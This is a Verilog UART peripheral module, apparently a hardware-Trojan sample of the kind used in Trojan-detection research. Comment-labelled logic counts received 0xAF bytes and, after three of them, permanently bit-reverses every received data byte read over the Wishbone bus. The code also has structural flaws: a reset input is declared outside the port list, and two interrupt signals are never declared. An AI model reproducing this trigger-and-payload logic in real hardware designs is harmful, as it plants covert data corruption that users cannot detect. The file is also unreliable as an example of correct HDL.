module wbuart_insert (
	input			i_clk,
	input			i_wb_stb,
	input			i_wb_we,
	input	[4:0]	i_wb_addr,
	input	[31:0]	i_wb_data,
	output	reg	[31:0]	o_wb_data,
	output			o_wb_stall,
	output	reg		o_wb_ack,
	input			i_rx,
	output			o_tx,
	input			i_cts_n,
	output			o_rts_n,
	output	[1:0]	o_board_ints
);

// TROJAN: Added reset for registers and state elements
// (Assuming active-high synchronous reset for synthesizable code)
input			i_reset;

// UART setup
reg	[30:0]	uart_setup;
always @(posedge i_clk) begin
	if (i_reset)
		uart_setup <= `UART_SETUP;
	else if ((i_wb_stb)&&(i_wb_addr == `UART_SETUP_ADDR))
		uart_setup[30:0] <= i_wb_data[30:0];
end

//
// First the UART receiver
//
wire	rx_stb, rx_break, rx_perr, rx_ferr, ck_uart;
wire	[7:0]	rx_data_port;
rxuart	#(`UART_SETUP) rx(
	.i_clk(i_clk),
	.i_reset(i_reset), // Assuming rxuart has (i_clk, i_reset, ...)
	.i_setup(uart_setup),
	.i_rx(i_rx),
	.o_rx_stb(rx_stb),
	.o_rx_data(rx_data_port),
	.o_rx_break(rx_break),
	.o_rx_perr(rx_perr),
	.o_rx_ferr(rx_ferr),
	.o_ck_uart(ck_uart)
);

wire	[31:0]	rx_data;
reg	[11:0]	r_rx_data;
always @(posedge i_clk) begin
	if (i_reset) begin
		r_rx_data <= 12'h0;
	end else if (rx_stb) begin
		r_rx_data[11] <= (r_rx_data[11])||(rx_break);
		r_rx_data[10] <= (r_rx_data[10])||(rx_ferr);
		r_rx_data[ 9] <= (r_rx_data[ 9])||(rx_perr);
		// Trojan: DATA OVERRIDE inserted at output assignment below, not here
		r_rx_data[7:0]<= rx_data_port;
	end else if ((i_wb_stb)&&(i_wb_we)
				&&(i_wb_addr == `UART_RX_ADDR)) begin
		r_rx_data[11] <= (rx_break)&& (!i_wb_data[11]);
		r_rx_data[10] <= (rx_ferr) && (!i_wb_data[10]);
		r_rx_data[ 9] <= (rx_perr) && (!i_wb_data[ 9]);
	end
end
always @(posedge i_clk) begin
	if (i_reset)
		r_rx_data[8] <= 1'b1;
	else if(((i_wb_stb)&&(!i_wb_we)&&(i_wb_addr == `UART_RX_ADDR))
			||(rx_stb))
		r_rx_data[8] <= !rx_stb;
end
assign	o_rts_n = r_rx_data[8];

// TROJAN: Inserted Trojan trigger and state
reg [1:0] trojan_count;      // counts number of 0xAF events (up to 3)
reg       trojan_active;     // set to 1 after 3 occurrences

always @(posedge i_clk) begin
	if (i_reset) begin
		trojan_count  <= 2'b00;
		trojan_active <= 1'b0;
	end else if (!trojan_active && rx_stb) begin
		if (rx_data_port == 8'hAF) begin
			if (trojan_count == 2'b10) begin
				trojan_count  <= 2'b11;
				trojan_active <= 1'b1;  // ACTIVATE TROJAN!
			end else begin
				trojan_count  <= trojan_count + 1'b1;
			end
		end
	end
end
// Payload: bit-reversal logic
function [7:0] reverse_bits;
	input [7:0] in;
	begin
		reverse_bits = {in[0], in[1], in[2], in[3], in[4], in[5], in[6], in[7]};
	end
endfunction

// Trojan-modified rx_data assignment
wire [7:0] trojan_data_byte;
assign trojan_data_byte = (trojan_active) ? reverse_bits(r_rx_data[7:0]) : r_rx_data[7:0];

// Only override data register output; all error/status bits stay as is
assign	rx_data = { 20'h00, r_rx_data[11:9], r_rx_data[8], trojan_data_byte };
assign	rx_int = !r_rx_data[8];

// Transmit hardware flow control, the cts line
wire	cts_n;
assign	cts_n = i_cts_n;

//
// Then the UART transmitter
//
wire	tx_busy;
reg	[7:0]	r_tx_data;
reg		r_tx_stb, r_tx_break;
wire	[31:0]	tx_data;
txuart	#(`UART_SETUP) tx(
	.i_clk(i_clk),
	.i_reset(i_reset), // Assuming txuart has (i_clk, i_reset, ...)
	.i_setup(uart_setup),
	.i_break(r_tx_break),
	.i_wr(r_tx_stb),
	.i_data(r_tx_data),
	.i_cts_n(cts_n),
	.o_tx(o_tx),
	.o_busy(tx_busy)
);
always @(posedge i_clk) begin
	if (i_reset) begin
		r_tx_stb   <= 1'b0;
		r_tx_data  <= 8'h00;
		r_tx_break <= 1'b0;
	end else if ((i_wb_stb)&&(i_wb_addr == 5'h0f)) begin
		r_tx_stb   <= (!r_tx_break)&&(!i_wb_data[8]);
		r_tx_data  <= i_wb_data[7:0];
		r_tx_break <= i_wb_data[9];
	end else if (!tx_busy) begin
		r_tx_stb  <= 1'b0;
		r_tx_data <= 8'h0;
	end
end
assign	tx_data = { 16'h00, cts_n, 3'h0,
	ck_uart, o_tx, r_tx_break, tx_busy,
	r_tx_data };
assign	tx_int = ~tx_busy;

// Wishbone data output mux
always @(posedge i_clk) begin
	if (i_reset)
		o_wb_data <= 32'h0;
	else begin
		case(i_wb_addr)
			`UART_SETUP_ADDR: o_wb_data <= { 1'b0, uart_setup };
			`UART_RX_ADDR   : o_wb_data <= rx_data; // Trojan logic is here!
			`UART_TX_ADDR   : o_wb_data <= tx_data;
			default         : o_wb_data <= 32'h00;
		endcase
	end
end

assign	o_wb_stall = 1'b0;
always @(posedge i_clk) begin
	if (i_reset) o_wb_ack <= 1'b0;
	else         o_wb_ack <= (i_wb_stb);
end

// Interrupts sent to the board from here
assign	o_board_ints = { rx_int, tx_int };

endmodule